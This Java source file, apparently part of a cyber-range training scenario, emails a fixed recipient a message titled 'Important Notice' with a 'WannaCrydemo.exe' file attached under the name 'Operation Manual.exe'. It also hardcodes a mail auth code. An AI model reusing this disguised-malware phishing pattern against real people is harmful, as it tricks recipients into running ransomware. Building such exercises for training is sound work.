package com.cyberpeace.scene.util;

import java.io.IOException;
import java.util.Date;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.*;

import com.cyberpeace.common.util.ConfigUtil;

public class JavaxJavaMailClient {

	public static String emailHost = ConfigUtil.getContextProperty("ojj.mail.host");

	public static String attachmentName = "/cpms/upload/WannaCrydemo.exe";

	public static String transportType = "smtp";

	public static String fromUser = "gp-game";

	public static String fromEmail = "gp-game@qq.com";

	public static String authCode = "sec123";

	public static String toEmail = "lihua@qq.com";

	public static String subject = "重要通知";

	public static void sendMail(Integer port, String text) throws IOException, MessagingException {

		// 1：初始化默认参数
		Properties props = new Properties();
		props.setProperty("mail.transport.protocol", transportType);
		props.setProperty("mail.host", emailHost);
		props.setProperty("mail.user", fromUser);
		props.setProperty("mail.from", fromEmail);
		props.setProperty("mail.smtp.ssl.enable", "true");
		props.setProperty("mail.smtp.starttls.enable", "false");
		props.setProperty("mail.smtp.ssl.protocols", "TLSv1.2");
		props.setProperty("mail.smtp.socketFactory", "javax.net.ssl.SSLSocketFactory");
		props.setProperty("mail.smtp.ssl.trust", emailHost);
		// 2：获取Session对象
		Session session = Session.getInstance(props, null);
		// session.setDebug(true);

		// 3：创建MimeMessage对象
		MimeMessage message = new MimeMessage(session);

		// 4：设置发件人、收件人、主题、（内容后面设置）
		String formName = fromEmail + " <" + fromEmail + ">";
		message.setFrom(new InternetAddress(formName));
		InternetAddress to = new InternetAddress(toEmail);
		message.setRecipient(Message.RecipientType.TO, to);
		// 设置邮件主题
		message.setSubject(subject);
		// 邮件发送时间
		message.setSentDate(new Date());

		// *****邮件内容携带 附件 + （HTML内容+图片）使用Content-Type:multipart/mixed ******//
		// 5：设置一个多资源混合的邮件块 设置此类型时可以同时存在 附件和邮件内容 mixed代表混合
		MimeMultipart mixed = new MimeMultipart("mixed");

		// 5.1：创建一个附件资源
		MimeBodyPart attachment = new MimeBodyPart();
		DataHandler dhFile = new DataHandler(new FileDataSource(attachmentName));
		// 设置dhFile附件处理
		attachment.setDataHandler(dhFile);
		// 设置中文附件名称
		attachment.setFileName(MimeUtility.encodeText("操作手册.exe"));

		// 5.2：先把附件资源混合到 mixed多资源邮件模块里
		mixed.addBodyPart(attachment);

		// 5.3：创建正文内容资源存储对象
		MimeBodyPart content = new MimeBodyPart();
		content.setContent(text, "text/html;charset=UTF-8");
		// 把正文内容混合到资源存储对象里
		mixed.addBodyPart(content);
		// 6：设置我们处理好的资源（存放到Message）
		message.setContent(mixed);
		// 7：保存上面设置的邮件内容
		message.saveChanges();
		// 8：获取Transport对象
		Transport transport = session.getTransport();
		// 9：smtp验证，就是你用来发邮件的邮箱用户名密码（若在之前的properties中指定默认值，这里可以不用再次设置）
		transport.connect(null, port, null, authCode);
		// 10：发送邮件
		transport.sendMessage(message, message.getAllRecipients());
		transport.close();
	}

}